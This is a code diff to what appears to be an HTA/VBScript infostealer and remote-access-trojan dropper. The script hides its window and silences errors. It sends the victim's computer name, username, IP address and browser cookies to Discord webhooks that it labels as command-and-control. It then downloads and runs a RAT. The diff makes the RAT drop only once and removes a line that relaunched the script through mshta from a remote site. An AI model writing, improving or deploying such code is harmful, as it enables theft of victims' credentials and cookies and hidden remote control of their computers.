@@ -6,7 +6,7 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER
+Dim sh, fso, WH, RE_WH, PC, USER, ratDropped
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -15,6 +15,7 @@ RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+ratDropped = False
 
 ' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
@@ -36,14 +37,12 @@ Do
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     
-    ' Download RAT EVERY re-grab
-    Call DropRAT(RE_WH, True)
+    ' Only download RAT if it hasn't dropped successfully yet
+    If Not ratDropped Then
+        Call DropRAT(RE_WH, True)
+    End If
     
     Call SleepSeconds(30)
-    
-    ' Spawn new mshta and exit current
-    Call RunCmd("mshta https://dicerigx.app/")
-    Exit Do
 Loop
 
 window.close()
@@ -75,6 +74,9 @@ Sub DropRAT(targetWH, sendRocket)
             
             ' Execute via WMI
             Call RunCmd("""" & op & """")
+            
+            ' Set flag to True so it stops downloading in the loop
+            ratDropped = True
             
             If sendRocket Then 
                 Call SleepSeconds(2)
